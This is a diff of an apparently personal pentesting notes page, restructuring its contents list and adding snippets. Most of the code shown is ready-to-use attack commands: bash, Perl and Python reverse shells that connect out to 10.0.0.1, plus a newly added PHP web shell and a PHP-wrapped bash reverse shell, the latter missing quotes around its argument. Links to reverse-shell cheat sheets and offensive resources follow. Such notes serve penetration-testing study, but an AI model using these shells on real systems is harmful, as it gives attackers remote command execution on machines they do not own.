@@ -3,33 +3,34 @@ layout: single
 permalink: /notes/
 author_profile: true
 ---
-# Random notes and useful things.
-- [Random notes and useful things.](#random-notes-and-useful-things)
-  - [Powershell](#powershell)
-    - [One liner to execute base64 encoded assembly](#one-liner-to-execute-base64-encoded-assembly)
-    - [Run arbitrary assembly](#run-arbitrary-assembly)
-    - [Download file](#download-file)
-    - [Powershell-friendly base64 from Linux](#powershell-friendly-base64-from-linux)
-    - [Base64 encode file](#base64-encode-file)
-  - [Shells](#shells)
-    - [Bash](#bash)
-      - [Perl](#perl)
-      - [Python](#python)
-    - [Sites](#sites)
-      - [Payloads all the things](#payloads-all-the-things)
-      - [Pentestmonkey](#pentestmonkey)
-  - [Resources(Useful Websites)](#resourcesuseful-websites)
-    - [General/OSCP](#generaloscp)
-    - [Privilege Escalation](#privilege-escalation)
-      - [Linux](#linux)
-      - [Windows](#windows)
-    - [Active Directory](#active-directory)
-      - [Offense](#offense)
-      - [Defense](#defense)
-    - [Web App](#web-app)
-    - [Buffer Overflow</h2>](#buffer-overflowh2)
-    - [Wireless](#wireless)
-    - [Tools](#tools)
+
+Random useful snippets/sites/etc
+- [Powershell](#powershell)
+  - [One liner to execute base64 encoded assembly](#one-liner-to-execute-base64-encoded-assembly)
+  - [Run arbitrary assembly](#run-arbitrary-assembly)
+  - [Download file](#download-file)
+  - [Powershell-friendly base64 from Linux](#powershell-friendly-base64-from-linux)
+  - [Base64 encode file](#base64-encode-file)
+- [Shells](#shells)
+  - [Bash](#bash)
+  - [Perl](#perl)
+  - [Python](#python)
+  - [PHP](#php)
+  - [Sites/Cheat sheets](#sitescheat-sheets)
+    - [PayloadsAllTheThings](#payloadsallthethings)
+    - [Pentestmonkey](#pentestmonkey)
+- [Resources(Useful Websites)](#resourcesuseful-websites)
+  - [General/OSCP](#generaloscp)
+  - [Privilege Escalation](#privilege-escalation)
+    - [Linux](#linux)
+    - [Windows](#windows)
+  - [Active Directory](#active-directory)
+    - [Offense](#offense)
+    - [Defense](#defense)
+  - [Web App](#web-app)
+  - [Buffer Overflow</h2>](#buffer-overflowh2)
+  - [Wireless](#wireless)
+  - [Tools](#tools)
 
 ## Powershell
 ### One liner to execute base64 encoded assembly
@@ -62,11 +63,11 @@ Background process
 ```
 bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'
 ```
-#### Perl
+### Perl
 ```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
-#### Python
+### Python
 One Liner
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -85,12 +86,22 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p = subprocess.call(["/bin/sh","-i"])
 ```
+### PHP
+Webshell
+```
+<?php echo system($_GET['cmd']); ?>
+```
+Bash reverse shell
+```
+<?php system(bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'); ?>
+```
 
-### Sites
-#### Payloads all the things
+### Sites/Cheat sheets
+#### PayloadsAllTheThings
 [Reverse shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 #### Pentestmonkey
 [Reverse shell cheat sheet]()
+
 ## Resources(Useful Websites)
 ### General/OSCP
 [https://guif.re](https://guif.re)  
